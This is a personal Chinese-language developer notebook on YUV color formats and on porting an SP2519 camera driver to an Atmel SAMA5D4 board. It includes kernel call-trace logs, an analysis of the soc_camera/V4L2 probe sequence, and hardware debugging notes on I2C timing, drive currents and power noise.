		YUV,YUV,YUV,YUV,YUV....
RGB:红绿蓝三色 像数点格式
YUV:Y亮度+UV两个描述色彩的 像数点格式
	YUV和RGB的转换:
	Y = 0.299 R + 0.587 G + 0.114 B
	U = -0.1687 R - 0.3313 G + 0.5 B + 128
	V = 0.5 R - 0.4187 G - 0.0813 B + 128
		R = Y + 1.402 (V-128)
		G= Y - 0.34414 (U-128) - 0.71414 (V-128)
		B= Y + 1.772 (U-128)
YCbCr: YUV的一个最广泛使用的分支格式,JPEG、MPEG均采用此格式,一般人们所讲的YUV大多是指YCbCr
	YCbCr与RGB的相互转换
	Y=0.299R+0.587G+0.114B
	Cb=0.564(B-Y)
	Cr=0.713(R-Y)
	R=Y+1.402Cr
	G=Y-0.344Cb-0.714Cr
	B=Y+1.772Cb
YUV（YCbCr）采样格式：
主要的采样格式有YCbCr 4:2:0、YCbCr 4:2:2、YCbCr 4:1:1和 YCbCr 4:4:4。
其中YCbCr 4:1:1 比较常用，其含义为：每个点保存一个 8bit 的亮度值(也就是Y值), 
	每 2 x 2 个点保存一个 Cr和Cb值, 图像在肉眼中的感觉不会起太大的变化。
	所以, 原来用 RGB(R,G,B 都是 8bit unsigned) 模型, 每个点需要 8x3=24 bits， 
	而现在仅需要 8+(8/4)+(8/4)=12bits, 平均每个点占12bits。这样就把图像的数据压缩了一半。
下面给出几种具体的存储形式：
（1） YUV 4:4:4
	YUV三个信道的抽样率相同，因此在生成的图像里，每个象素的三个分量信息完整（每个分量通常8比特），
	经过8比特量化之后，未经压缩的每个像素占用3个字节。
	下面的四个像素为: [Y0 U0 V0] [Y1 U1 V1] [Y2 U2 V2] [Y3 U3 V3]
	存放的码流为: Y0 U0 V0 Y1 U1 V1 Y2 U2 V2 Y3 U3 V3
（2） YUV 4:2:2
	每个色差信道的抽样率是亮度信道的一半，所以水平方向的色度抽样率只是4:4:4的一半。对非压缩的8比特量化的图像来说，
	每个由两个水平方向相邻的像素组成的宏像素需要占用4字节内存(例如下面映射出的前两个像素点只需要Y0、Y1、U0、V1四个字节)。
	下面的四个像素为: [Y0 U0 V0] [Y1 U1 V1] [Y2 U2 V2] [Y3 U3 V3]
	存放的码流为: Y0 U0 Y1 V1 Y2 U2 Y3 V3
	映射出像素点为：[Y0 U0 V1] [Y1 U0 V1] [Y2 U2 V3] [Y3 U2 V3]
（3） YUV 4:1:1
	4:1:1的色度抽样，是在水平方向上对色度进行4:1抽样。对于低端用户和消费类产品这仍然是可以接受的。
	对非压缩的8比特量化的视频来说，每个由4个水平方向相邻的像素组成的宏像素需要占用6字节内存
	下面的四个像素为: [Y0 U0 V0] [Y1 U1 V1] [Y2 U2 V2] [Y3 U3 V3]
	存放的码流为: Y0 U0 Y1 Y2 V2 Y3
	映射出像素点为：[Y0 U0 V2] [Y1 U0 V2] [Y2 U0 V2] [Y3 U0 V2]
（4）YUV4:2:0
	4:2:0并不意味着只有Y,Cb而没有Cr分量。它指得是对每行扫描线来说，只有一种色度分量以2:1的抽样率存储。
	相邻的扫描行存储不同的色度分量，也就是说，如果一行是4:2:0的话，下一行就是4:0:2，再下一行是4:2:0...以此类推。
	对每个色度分量来说，水平方向和竖直方向的抽样率都是2:1，所以可以说色度的抽样率是4:1。
	对非压缩的8比特量化的视频来说，每个由2x2个2行2列相邻的像素组成的宏像素需要占用6字节内存。
	下面八个像素为：
		[Y0 U0 V0] [Y1 U1 V1] [Y2 U2 V2] [Y3 U3 V3]
		[Y5 U5 V5] [Y6 U6 V6] [Y7U7 V7] [Y8 U8 V8]
	存放的码流为：
		Y0 U0 Y1 Y2 U2 Y3
		Y5 V5 Y6 Y7 V7 Y8
	映射出的像素点为：
		[Y0 U0 V5] [Y1 U0 V5] [Y2 U2 V7] [Y3 U2 V7]
		[Y5 U0 V5] [Y6 U0 V5] [Y7U2 V7] [Y8 U2 V7]









20160622
调整测试环境(使用 sama5d4开发板)
先建立一个 for_sp2519_project 的 专门调试 sp2519 驱动的项目文件夹
at91bootstrap-sama5d4_xplained.bin  //原demo提供的
u-boot.bin	//uboot1编译出的
.dtb	//kernel1最后编译的
zImage	//kernel1最后编译的
rootfs  //之前的编译的rootfs没一个适用,需要重新编译buildroot,只需要gstreamer相关库就行,不需要 tslib和qt
	//编译出来.ubi大小才14mb
	//傻逼了,重新设置编译,忘了先备份已经下好的 dl软件包!!!!!
	//注意:
	//	rootfs1是用于生成一个rootfs的实验!!!
	//	rootfs2是官方demo的,用来实现解压ubi和重新编译ubi的实验
	//	rootfs3的并没有安装gstreamer,只是可以测试touchscreen,和QT的
成功运行ov2640摄像头并显示!!!
测试环境通过;
后面就是修改测试 sp2519的摄像头驱动了!!!!
首先修改 ov2640 框架直接对sensor操作的函数
	sp2519_write_array i2c队列写的				感觉不用改
	sp2519_mask_set 构造具体数值,i2c写入			暂时用不着
	sp2519_reset	i2c写入控制 芯片重启!!			已改
	sp2519_select_win 选择窗口大小				感觉不用改
	sp2519_set_params 调用 sp2519_write_array		感觉要大改!!!!!!
		首先ov2640是可以以多种格式传输的,RGB YUV RAW
		而sp2519 只可以yuv和raw格式传输,所以并没有专门的这样的函数设计
		主要看传输格式的变化!!!
		要清楚都干了什么的话,需要分析他们的寄存器初始化操作!!!
		ov2640:
			其实也就是设置了IMAGE_MODE 而已,其他的只是做了延时处理
	sp2519_s_ctrl i2c写入控制 选择是否对图像镜向翻转操作	已改
至此,驱动文件的修改大致完成:
接着 修改内核配置添加 sp2519,按照之前弄ov7670那样配置,
接着,为了提高调试效率!!先录下使用ov2640时的log消息:









20160628
几经波折,终于可以使用I2C
	读取productID 这一步是,芯片通 mck后, 的第一次 设置配置操作
	然而芯片还没有完全动起来,就用i2c会导致失败
	所以在sp2519_video_probe 使用i2c之前,先延时一段时间, msleep(5);
开始初始化,在i2c第 442 条配置后,开始出错
	第442条初始化是启动 VS 信号 输出data
	但是一个问题是,一旦启动了VS信号后,就会干扰到i2c,使得i2c不能正常工作!!!!
	所以要在所有设置都完成后才output图像!!!
	比如我是在init_array最后才设置output_on,但是似乎是错误的,因为除了init_array后还有其他i2c设置
		因为init后也有其他的初始化!!!!
		然而很意外地成功运行了,但是失真严重,而且640X480 只有11.5帧,
			而且是在探针接到h v 信号时,阻挡了一些干扰i2c的成分,让i2c可以继续设置,才成功运行
	不过总算成功了,所以也证明了以下一些内容:
		做出来的电源可用,thank goodness
		对于fpc那25针的次序排列并没有错封装 sp2519的D2~D9,接sama5d4的D0~D7
		i2c的时钟数据触发等所有特性都可以沿用 ov2640了
		还有 h v信号的特性也 与 ov2640 一样,
		还有 datasheet 说用24mhz,但是sama5d4只能用25mhz的,然而勉强可用,
	但是不知道,是不是时钟的原因导致失真,
	也不知道,哪里设置了帧数率
接下来就是分析gstreamer软件的调用,具体去分析摄像头驱动是怎么被调用的!!!!!
	特别是要知道,图像是怎么源源不断进来的机制!!!!!
				





20160629
/**log**/
# gst-launch v4l2src device="/dev/video0" ! video/x-raw-yuv,width=640,height=480
 ! ffmpegcolorspace ! fbdevsink
Setting pipeline to PAUSED ...
CPU: 0 PID: 727 Comm: gst-launch-0.10 Not tainted 4.1.0-linux4sam_5.3 #313
Hardware name: Atmel SAMA5
[<c0013814>] (unwind_backtrace) from [<c00117f4>] (show_stack+0x10/0x14)
[<c00117f4>] (show_stack) from [<c034001c>] (soc_camera_open+0x18/0x2d4)
[<c034001c>] (soc_camera_open) from [<c03248a8>] (v4l2_open+0xa0/0xe0)
[<c03248a8>] (v4l2_open) from [<c0098958>] (chrdev_open+0xa0/0x140)
[<c0098958>] (chrdev_open) from [<c0093858>] (do_dentry_open.isra.11+0xe8/0x2e8)
[<c0093858>] (do_dentry_open.isra.11) from [<c009f460>] (do_last.isra.43+0x4cc/0xb9c)
[<c009f460>] (do_last.isra.43) from [<c00a0f48>] (path_openat+0x7c/0x520)
[<c00a0f48>] (path_openat) from [<c00a2140>] (do_filp_open+0x2c/0x80)
[<c00a2140>] (do_filp_open) from [<c009495c>] (do_sys_open+0x110/0x1cc)
[<c009495c>] (do_sys_open) from [<c000f360>] (ret_fast_syscall+0x0/0x3c)
atmel_isi f0008000.isi: Atmel ISI Camera driver attached to camera 0
clk_system_prepare 
ov2640 0-0030: ov2640_hw_power: ENABLE the camera
soc-camera-pdrv soc-camera-pdrv.0: S_FMT(YUYV, 800x600)
soc-camera-pdrv soc-camera-pdrv.0: TRY_FMT(YUYV, 800x600)
ov2640 0-0030: ov2640_set_params: Selected cfmt YUYV (YUV422)
clk_sam9x5_peripheral_enable
ov2640 0-0030: ov2640_reset: (ret 0)
ov2640 0-0030: ov2640_set_params: Init default
ov2640 0-0030: ov2640_set_params: Set size to SVGA
ov2640 0-0030: ov2640_set_params: Set cfmt
soc-camera-pdrv soc-camera-pdrv.0: set width: 800 height: 600
atmel_isi f0008000.isi: Flags cam: 0x175 host: 0x1fd common: 0x175
atmel_isi f0008000.isi: vsync active high, hsync active high, sampling on pix clock rising edge
soc-camera-pdrv soc-camera-pdrv.0: camera device open
soc-camera-pdrv soc-camera-pdrv.0: TRY_FMT(YUYV, 1x1)
soc-camera-pdrv soc-camera-pdrv.0: TRY_FMT(YUYV, 32768x32768)
soc-camera-pdrv soc-camera-pdrv.0: TRY_FMT(YUYV, 32768x32768)
soc-camera-pdrv soc-camera-pdrv.0: TRY_FMT(YUYV, 1x1)
soc-camera-pdrv soc-camera-pdrv.0: TRY_FMT(YUYV, 32768x32768)
soc-camera-pdrv soc-camera-pdrv.0: TRY_FMT(YUYV, 32768x32768)
soc-camera-pdrv soc-camera-pdrv.0: TRY_FMT(YUYV, 1x1)
soc-camera-pdrv soc-camera-pdrv.0: TRY_FMT(YUYV, 32768x32768)
soc-camera-pdrv soc-camera-pdrv.0: TRY_FMT(YUYV, 32768x32768)
soc-camera-pdrv soc-camera-pdrv.0: TRY_FMT(UYVY, 1x1)
soc-camera-pdrv soc-camera-pdrv.0: TRY_FMT(UYVY, 32768x32768)
soc-camera-pdrv soc-camera-pdrv.0: TRY_FMT(UYVY, 32768x32768)
soc-camera-pdrv soc-camera-pdrv.0: TRY_FMT(RGBP, 1x1)
soc-camera-pdrv soc-camera-pdrv.0: TRY_FMT(RGBP, 32768x32768)
soc-camera-pdrv soc-camera-pdrv.0: TRY_FMT(RGBP, 32768x32768)
soc-camera-pdrv soc-camera-pdrv.0: TRY_FMT(RGBR, 1x1)
soc-camera-pdrv soc-camera-pdrv.0: TRY_FMT(RGBR, 32768x32768)
soc-camera-pdrv soc-camera-pdrv.0: TRY_FMT(RGBR, 32768x32768)
soc-camera-pdrv soc-camera-pdrv.0: TRY_FMT(RGBP, 1x1)
soc-camera-pdrv soc-camera-pdrv.0: TRY_FMT(RGBP, 32768x32768)
soc-camera-pdrv soc-camera-pdrv.0: TRY_FMT(RGBP, 32768x32768)
soc-camera-pdrv soc-camera-pdrv.0: TRY_FMT(RGBP, 1x1)
soc-camera-pdrv soc-camera-pdrv.0: TRY_FMT(RGBP, 32768x32768)
soc-camera-pdrv soc-camera-pdrv.0: TRY_FMT(RGBP, 32768x32768)
soc-camera-pdrv soc-camera-pdrv.0: current_fmt->fourcc: 0x56595559
soc-camera-pdrv soc-camera-pdrv.0: S_FMT(YUYV, 640x480)
soc-camera-pdrv soc-camera-pdrv.0: TRY_FMT(YUYV, 640x480)
ov2640 0-0030: ov2640_set_params: Selected cfmt YUYV (YUV422)
ov2640 0-0030: ov2640_reset: (ret 0)
ov2640 0-0030: ov2640_set_params: Init default
ov2640 0-0030: ov2640_set_params: Set size to VGA
ov2640 0-0030: ov2640_set_params: Set cfmt
soc-camera-pdrv soc-camera-pdrv.0: set width: 640 height: 480
atmel_isi f0008000.isi: Flags cam: 0x175 host: 0x1fd common: 0x175
atmel_isi f0008000.isi: vsync active high, hsync active high, sampling on pix clock rising edge
atmel_isi f0008000.isi: queue_setup, count=2, size=614400
soc-camera-pdrv soc-camera-pdrv.0: mmap called, vma=0xd41c1030
soc-camera-pdrv soc-camera-pdrv.0: vma start=0xb6802000, size=614400, ret=0
soc-camera-pdrv soc-camera-pdrv.0: mmap called, vma=0xd41bcfa8
soc-camera-pdrv soc-camera-pdrv.0: vma start=0xb676c000, size=614400, ret=0
clk_sam9x5_peripheral_enable
Pipeline is live and does not need PREROLL ...
Setting pipeline to PLAYING ...
New clock: GstSystemClock
/**log**/
gstreamer先学着打开 /dev/video0
	do_sys_open -> do_filp_open -> path_openat -> do_last.isra.43 -> do_dentry_open.isra.11 -> chrdev_open
 	由于/dev/video0 注册为字符设备,自然通过 chrdev_open 的入口:
		static int chrdev_open(struct inode *inode, struct file *filp) (/fs/Char_dev.c)
		其中:ret = filp->f_op->open(inode, filp);就是调用了/dev/video0 注册了的f_op.open:V4l2_open
		至于何时如何从哪个驱动注册上,并未探知
	继续讨论 V4l2_open:
		static int v4l2_open(struct inode *inode, struct file *filp) (/drivers/media/v4l2-core/V4l2-dev.c)
		其中:ret = vdev->fops->open(filp);调用了注册在v4l2驱动上的 soc_camera_open
		而这个就是我们atmel 特有的摄像头驱动框架
	而一切初始化内容都是从soc_camera出发!!

以下重点分析 soc_camera.c 和 soc_camera_platform.c
先分析:soc_camera_platform.c (v4l2_subde的具体实现)

	static struct v4l2_subdev_core_ops platform_subdev_core_ops = {
		.s_power = soc_camera_platform_s_power,			//启动,这里是启动了isi,还是设置了sensor的pwd? 未挖掘
	};
	static struct v4l2_subdev_video_ops platform_subdev_video_ops = {
		.s_stream	= soc_camera_platform_s_stream,		//start streaming
		.cropcap	= soc_camera_platform_cropcap,		//设置 v4l2_cropcap
			//cropcap即cropping capacity (取景属性)   其中:
			//	v4l2_cropcap.bounds 是sensor捕捉图像的位置和范围
			//	v4l2_cropcap.defrect 是指在bounds内,可取样范围
			//	v4l2_cropcap.pixelaspect; // 定义了图片的宽高比
			//补充:
			//	v4l2_crop.c 是seneor 可取样范围里,的实际取景范围	(这里.c是其中那个c变量,不要混淆 .c文件)
			//		而这部分取景范围才是 我们用户使用的有效数据
			//		这部分数据再经 scaling (缩放)算法缩放成实际输出图像
		.g_crop		= soc_camera_platform_g_crop,		//设置v4l2_crop的,重点设置v4l2_crop.c
		.g_mbus_config	= soc_camera_platform_g_mbus_config,	//设置图像传输总线方式:
			//例如以下三种:
 			// * @V4L2_MBUS_PARALLEL:	parallel interface with hsync and vsync
			// * @V4L2_MBUS_BT656:		parallel interface with embedded synchronisation, can
			// *				also be used for BT.1120
			// * @V4L2_MBUS_CSI2:		MIPI CSI-2 serial interface
	};
	static const struct v4l2_subdev_pad_ops platform_subdev_pad_ops = {
		.enum_mbus_code = soc_camera_platform_enum_mbus_code,	//枚举 sensor 提供多少种 图像传输 格式
		.get_fmt	= soc_camera_platform_fill_fmt,		//获取 图像传输 格式 
		.set_fmt	= soc_camera_platform_fill_fmt,		//设置 图像传输 格式 
			//get_fmt 和 set_fmt 都一样 (所以貌似这两个并没有实际用上)
	};
	static struct v4l2_subdev_ops platform_subdev_ops = {
		.core	= &platform_subdev_core_ops,
		.video	= &platform_subdev_video_ops,
		.pad	= &platform_subdev_pad_ops,
	};
//卧槽,soc_camera_platform.c 并没有被烧录写入,白分析了!!!!!!!!!!!!
//soc_camera.c 和 soc_camera_platform.c是功能框架一样的,但是却是面向不同的sensor类型
接着分析:soc_camera.c ()
	很神奇,module_platform_driver(soc_camera_pdrv);说明了这是一平台总线上的设备,
		所以执行 probe初始化时,先要有步骤把 "soc-camera-pdrv" device信息注入平台总线上才行.
		但是并没有找到在哪里注入? 注意,并没有在dtb上注入,但是可以肯定的是,一定probe了!!!
		
	soc_camera_host_register() 实际上所有驱动初始化都从这里走,
		而调用这的是 atmel_isi.c,而不是	soc_camera.c本身里面自己的函数调用
	感觉分析不下去了,要先看 atmel_isi.c 因为 soc_camera.c作为平台总线上的设备驱动,
		在没有设备信息注入的情况下自己soc_camera_pdrv_probe了,
		还有, soc_camera_pdrv_probe之前, soc_camera.c自身的函数居然还可以被调用,卧槽!!!
卧槽
卧槽,终于找到了为什么会这样了!!!!!!!
	首先 dtb 并没有  "soc-camera-pdrv" 项,所以不可能通过dtb 注入设备信息!!!
	然后发现,atmel_isi_probe的时候,就会自动 soc_camera_pdrv_probe,!!!
	经过 dump_stack()发现,不简单, 先来一段启动 log!!!
/*log*/
atmel_isi_probe!!
in atmel_isi_probe, before stepin soc_camera_host_register  !!
scan_of_host !! 
soc_of_bind !! 
CPU: 0 PID: 1 Comm: swapper Not tainted 4.1.0-linux4sam_5.3 #343
Hardware name: Atmel SAMA5
[<c0013814>] (unwind_backtrace) from [<c00117f4>] (show_stack+0x10/0x14)
[<c00117f4>] (show_stack) from [<c033f548>] (soc_camera_pdrv_probe+0x10/0x190)
[<c033f548>] (soc_camera_pdrv_probe) from [<c027758c>] (platform_drv_probe+0x48/0xa4)
[<c027758c>] (platform_drv_probe) from [<c0276228>] (driver_probe_device+0x1c0/0x264)
[<c0276228>] (driver_probe_device) from [<c0274a1c>] (bus_for_each_drv+0x44/0x8c)
[<c0274a1c>] (bus_for_each_drv) from [<c0276030>] (device_attach+0x70/0x88)
[<c0276030>] (device_attach) from [<c0275768>] (bus_probe_device+0x84/0xa8)
[<c0275768>] (bus_probe_device) from [<c0273ce8>] (device_add+0x33c/0x524)
[<c0273ce8>] (device_add) from [<c0277730>] (platform_device_add+0xac/0x214)
[<c0277730>] (platform_device_add) from [<c033fb84>] (soc_camera_add_pdev+0x10/0x30)
[<c033fb84>] (soc_camera_add_pdev) from [<c0341984>] (soc_of_bind.isra.2+0x84/0x1c8)
[<c0341984>] (soc_of_bind.isra.2) from [<c0341ca4>] (soc_camera_host_register+0x1dc/0x344)
[<c0341ca4>] (soc_camera_host_register) from [<c0343b54>] (atmel_isi_probe+0x38c/0x4f8)
[<c0343b54>] (atmel_isi_probe) from [<c027758c>] (platform_drv_probe+0x48/0xa4)
[<c027758c>] (platform_drv_probe) from [<c0276228>] (driver_probe_device+0x1c0/0x264)
[<c0276228>] (driver_probe_device) from [<c0276358>] (__driver_attach+0x8c/0x90)
[<c0276358>] (__driver_attach) from [<c0274ab8>] (bus_for_each_dev+0x54/0x88)
[<c0274ab8>] (bus_for_each_dev) from [<c0275954>] (bus_add_driver+0xd4/0x1d0)
[<c0275954>] (bus_add_driver) from [<c027695c>] (driver_register+0x78/0xf4)
[<c027695c>] (driver_register) from [<c027749c>] (__platform_driver_probe+0x20/0x70)
[<c027749c>] (__platform_driver_probe) from [<c00095c4>] (do_one_initcall+0x80/0x1d0)
[<c00095c4>] (do_one_initcall) from [<c06a0d18>] (kernel_init_freeable+0xe8/0x1b0)
[<c06a0d18>] (kernel_init_freeable) from [<c04ca2d4>] (kernel_init+0x8/0xec)
[<c04ca2d4>] (kernel_init) from [<c000f408>] (ret_from_fork+0x14/0x2c)
soc_camera_pdrv_probe !! 
soc_of_bind !! 
CPU: 0 PID: 1 Comm: swapper Not tainted 4.1.0-linux4sam_5.3 #343
Hardware name: Atmel SAMA5
[<c0013814>] (unwind_backtrace) from [<c00117f4>] (show_stack+0x10/0x14)
[<c00117f4>] (show_stack) from [<c033f548>] (soc_camera_pdrv_probe+0x10/0x190)
[<c033f548>] (soc_camera_pdrv_probe) from [<c027758c>] (platform_drv_probe+0x48/0xa4)
[<c027758c>] (platform_drv_probe) from [<c0276228>] (driver_probe_device+0x1c0/0x264)
[<c0276228>] (driver_probe_device) from [<c0274a1c>] (bus_for_each_drv+0x44/0x8c)
[<c0274a1c>] (bus_for_each_drv) from [<c0276030>] (device_attach+0x70/0x88)
[<c0276030>] (device_attach) from [<c0275768>] (bus_probe_device+0x84/0xa8)
[<c0275768>] (bus_probe_device) from [<c0273ce8>] (device_add+0x33c/0x524)
[<c0273ce8>] (device_add) from [<c0277730>] (platform_device_add+0xac/0x214)
[<c0277730>] (platform_device_add) from [<c033fb84>] (soc_camera_add_pdev+0x10/0x30)
[<c033fb84>] (soc_camera_add_pdev) from [<c0341984>] (soc_of_bind.isra.2+0x84/0x1c8)
[<c0341984>] (soc_of_bind.isra.2) from [<c0341ca4>] (soc_camera_host_register+0x1dc/0x344)
[<c0341ca4>] (soc_camera_host_register) from [<c0343b54>] (atmel_isi_probe+0x38c/0x4f8)
[<c0343b54>] (atmel_isi_probe) from [<c027758c>] (platform_drv_probe+0x48/0xa4)
[<c027758c>] (platform_drv_probe) from [<c0276228>] (driver_probe_device+0x1c0/0x264)
[<c0276228>] (driver_probe_device) from [<c0276358>] (__driver_attach+0x8c/0x90)
[<c0276358>] (__driver_attach) from [<c0274ab8>] (bus_for_each_dev+0x54/0x88)
[<c0274ab8>] (bus_for_each_dev) from [<c0275954>] (bus_add_driver+0xd4/0x1d0)
[<c0275954>] (bus_add_driver) from [<c027695c>] (driver_register+0x78/0xf4)
[<c027695c>] (driver_register) from [<c027749c>] (__platform_driver_probe+0x20/0x70)
[<c027749c>] (__platform_driver_probe) from [<c00095c4>] (do_one_initcall+0x80/0x1d0)
[<c00095c4>] (do_one_initcall) from [<c06a0d18>] (kernel_init_freeable+0xe8/0x1b0)
[<c06a0d18>] (kernel_init_freeable) from [<c04ca2d4>] (kernel_init+0x8/0xec)
[<c04ca2d4>] (kernel_init) from [<c000f408>] (ret_from_fork+0x14/0x2c)
soc_camera_pdrv_probe !! 
atmel_isi f0008000.isi: group probe failed: -17
soc_of_bind !! 
CPU: 0 PID: 1 Comm: swapper Not tainted 4.1.0-linux4sam_5.3 #343
Hardware name: Atmel SAMA5
[<c0013814>] (unwind_backtrace) from [<c00117f4>] (show_stack+0x10/0x14)
[<c00117f4>] (show_stack) from [<c033f548>] (soc_camera_pdrv_probe+0x10/0x190)
[<c033f548>] (soc_camera_pdrv_probe) from [<c027758c>] (platform_drv_probe+0x48/0xa4)
[<c027758c>] (platform_drv_probe) from [<c0276228>] (driver_probe_device+0x1c0/0x264)
[<c0276228>] (driver_probe_device) from [<c0274a1c>] (bus_for_each_drv+0x44/0x8c)
[<c0274a1c>] (bus_for_each_drv) from [<c0276030>] (device_attach+0x70/0x88)
[<c0276030>] (device_attach) from [<c0275768>] (bus_probe_device+0x84/0xa8)
[<c0275768>] (bus_probe_device) from [<c0273ce8>] (device_add+0x33c/0x524)
[<c0273ce8>] (device_add) from [<c0277730>] (platform_device_add+0xac/0x214)
[<c0277730>] (platform_device_add) from [<c033fb84>] (soc_camera_add_pdev+0x10/0x30)
[<c033fb84>] (soc_camera_add_pdev) from [<c0341984>] (soc_of_bind.isra.2+0x84/0x1c8)
[<c0341984>] (soc_of_bind.isra.2) from [<c0341ca4>] (soc_camera_host_register+0x1dc/0x344)
[<c0341ca4>] (soc_camera_host_register) from [<c0343b54>] (atmel_isi_probe+0x38c/0x4f8)
[<c0343b54>] (atmel_isi_probe) from [<c027758c>] (platform_drv_probe+0x48/0xa4)
[<c027758c>] (platform_drv_probe) from [<c0276228>] (driver_probe_device+0x1c0/0x264)
[<c0276228>] (driver_probe_device) from [<c0276358>] (__driver_attach+0x8c/0x90)
[<c0276358>] (__driver_attach) from [<c0274ab8>] (bus_for_each_dev+0x54/0x88)
[<c0274ab8>] (bus_for_each_dev) from [<c0275954>] (bus_add_driver+0xd4/0x1d0)
[<c0275954>] (bus_add_driver) from [<c027695c>] (driver_register+0x78/0xf4)
[<c027695c>] (driver_register) from [<c027749c>] (__platform_driver_probe+0x20/0x70)
[<c027749c>] (__platform_driver_probe) from [<c00095c4>] (do_one_initcall+0x80/0x1d0)
[<c00095c4>] (do_one_initcall) from [<c06a0d18>] (kernel_init_freeable+0xe8/0x1b0)
[<c06a0d18>] (kernel_init_freeable) from [<c04ca2d4>] (kernel_init+0x8/0xec)
[<c04ca2d4>] (kernel_init) from [<c000f408>] (ret_from_fork+0x14/0x2c)
soc_camera_pdrv_probe !! 
CPU: 0 PID: 1 Comm: swapper Not tainted 4.1.0-linux4sam_5.3 #343
Hardware name: Atmel SAMA5
[<c0013814>] (unwind_backtrace) from [<c00117f4>] (show_stack+0x10/0x14)
[<c00117f4>] (show_stack) from [<c0341648>] (soc_camera_async_complete+0x10/0x5c)
[<c0341648>] (soc_camera_async_complete) from [<c03340f4>] (v4l2_async_test_notify+0xec/0xf8)
[<c03340f4>] (v4l2_async_test_notify) from [<c03342b4>] (v4l2_async_notifier_register+0x104/0x154)
[<c03342b4>] (v4l2_async_notifier_register) from [<c0341a20>] (soc_of_bind.isra.2+0x120/0x1c8)
[<c0341a20>] (soc_of_bind.isra.2) from [<c0341ca4>] (soc_camera_host_register+0x1dc/0x344)
[<c0341ca4>] (soc_camera_host_register) from [<c0343b54>] (atmel_isi_probe+0x38c/0x4f8)
[<c0343b54>] (atmel_isi_probe) from [<c027758c>] (platform_drv_probe+0x48/0xa4)
[<c027758c>] (platform_drv_probe) from [<c0276228>] (driver_probe_device+0x1c0/0x264)
[<c0276228>] (driver_probe_device) from [<c0276358>] (__driver_attach+0x8c/0x90)
[<c0276358>] (__driver_attach) from [<c0274ab8>] (bus_for_each_dev+0x54/0x88)
[<c0274ab8>] (bus_for_each_dev) from [<c0275954>] (bus_add_driver+0xd4/0x1d0)
[<c0275954>] (bus_add_driver) from [<c027695c>] (driver_register+0x78/0xf4)
[<c027695c>] (driver_register) from [<c027749c>] (__platform_driver_probe+0x20/0x70)
[<c027749c>] (__platform_driver_probe) from [<c00095c4>] (do_one_initcall+0x80/0x1d0)
[<c00095c4>] (do_one_initcall) from [<c06a0d18>] (kernel_init_freeable+0xe8/0x1b0)
[<c06a0d18>] (kernel_init_freeable) from [<c04ca2d4>] (kernel_init+0x8/0xec)
[<c04ca2d4>] (kernel_init) from [<c000f408>] (ret_from_fork+0x14/0x2c)
soc_camera_async_complete !! 
soc_camera_probe !! 
soc-camera-pdrv soc-camera-pdrv.1: Probing soc-camera-pdrv.1
atmel_isi f0008000.isi: Atmel ISI Camera driver attached to camera 1
soc-camera-pdrv soc-camera-pdrv.1: Found 6 supported formats.
atmel_isi f0008000.isi: Providing format Packed YUV422 16 bit using code 8200
atmel_isi f0008000.isi: Providing format RGB565 using code 8200
atmel_isi f0008000.isi: Providing format Packed YUV422 16 bit using code 8198
atmel_isi f0008000.isi: Providing format RGB565 using code 8198
atmel_isi f0008000.isi: Atmel ISI Camera driver detached from camera 1
in atmel_isi_probe, after soc_camera_host_register  !!
atmel_isi_probed !! 
/*log*/
	上述log是 atmel_isi_probe 的全过程!!!!!!
	首先atmel_isi_probe -> soc_camera_host_register 
		注意这时,soc_camera.c只是挂入了platform总线,但是还没有匹配device信息,所以没有probe,
		所以从传统方式看,因为还未把里面的操作函数挂到指定 ops集上,
		所以理论上还未能访问soc_camera.c 里的函数,
		但是 soc_camera_host_register 用 EXPORT_SYMBOL(soc_camera_host_register); 标出是全局可用
		所以就直接用上了!!!
	soc_camera_host_register -> scan_of_host -> soc_of_bind-> soc_camera_add_pdev 
		这里是soc_camera_host_register调用内部的一些函数,
		soc_camera.c自己给自己构造设备信息,然后再自己注入 平台总线上
		soc_of_bind.isra.2 与 soc_of_bind 区别????(一样的,不过不知道为何名字改了)
	soc_camera_add_pdev -> soc_of_bind -> soc_camera_dyn_pdev ->
		pdev = platform_device_alloc("soc-camera-pdrv", i);	在这里设置了设备信息
	然后就是 -> platform_device_add 注入设备信息
	然后就辗转到 soc_camera_pdrv_probe 完成了设备驱动注册到linux
	然后,回到 soc_of_bind 继续 -> soc_camera_async_complete -> soc_camera_probe
		soc_camera_probe()才是进行一些列的驱动初始化工作!!
	最后,回到 atmel_isi_probe 继续完成isi的初始化工作!!!
补习:
container_of(ptr,type,member) //已知member位置, 需找member所在的type变量的位置, 返回type变量的位置指针 
	





20170704
探究失真问题:
	一开始认为是转接口布线紊乱的问题,
	然后使用了排线,却没有用,后来发现是布线太长的问题,芯片驱动能力不够!!!
	尝试 加大data排线 I/O 口的驱动能力!!
	默认 p0:0x1c 是0x0f Data pad driver current 4ma
	     p0:0x1f 是0xd0 pclk pad driver current 8ma
	     p0:0x2e 是0xc0 hv signal is 00
	暂时相对稳定!!!
	调试:
	data   0x17 8ma		pclk  0xe0 12ma		hvsignal  0xc5 01	图像偏不稳定,不易开启
	data   0x1f 12ma	pclk  0xe0 12ma		hvsignal  0xc5 01	图像更不稳定
	data   0x1f 12ma	pclk  0xf0 16ma		hvsignal  0xc5 01	图像更不稳定
	data   0x1f 12ma	pclk  0xf0 16ma		hvsignal  0xca 10	图像更不稳定
	data   0x17 8ma		pclk  0xe0 12ma		hvsignal  0xca 10	图像偏不稳定
	data   0x0f 4ma		pclk  0xd0 8ma		hvsignal  0xca 10	图像不显示
	data   0x0f 4ma		pclk  0xd0 8ma		hvsignal  0xc5 01	不好启动,但相对最稳定

	提高了data pck 驱动电流,反而死的更快!!!
	还有发现了,有时,当光通量足够多的时候, 更容易成功开启!!!!当光通量更暗时,更难开启
	还有一个重点是,布线干扰,摄像头不能直接粘到板子上!!!!因为贴住地方的 toplayer层有布线,所以有强烈的电磁干扰!!!!!!!
最后发现是电源噪音的问题!!!
	芯片工作时,芯片噪音高达 66mhz
	在sensor三个电源处并联,100nf,10nf 1nfa 510pf
	在ldo 芯片输入电源处并联,100nf,10nf 1nfa 510pf
	发现并没有很好地滤波(卧槽 ,多不知道怎么接了)








20170706
分析V4L2!!!
参考:http://blog.csdn.net/evilcode/article/details/6337155

V4L2(video for linux) 可以支持多种设备，它可以有以下5种接口：
1、视频采集接口(video capture interface)：这种应用的设备可以是高频头或者摄像头.V4L2的最初设计就是应用于这种功能的.下面也是着重讲解这种应用；
2、视频输出接口(video output interface)：可以驱动计算机的外围视频图像设备——像可以输出电视信号格式的设备；
3、直接传输视频接口(video overlay interface)：它的主要工作是把从视频采集设备采集过来的信号直接输出到输出设备之上,而不用经过系统的CPU；
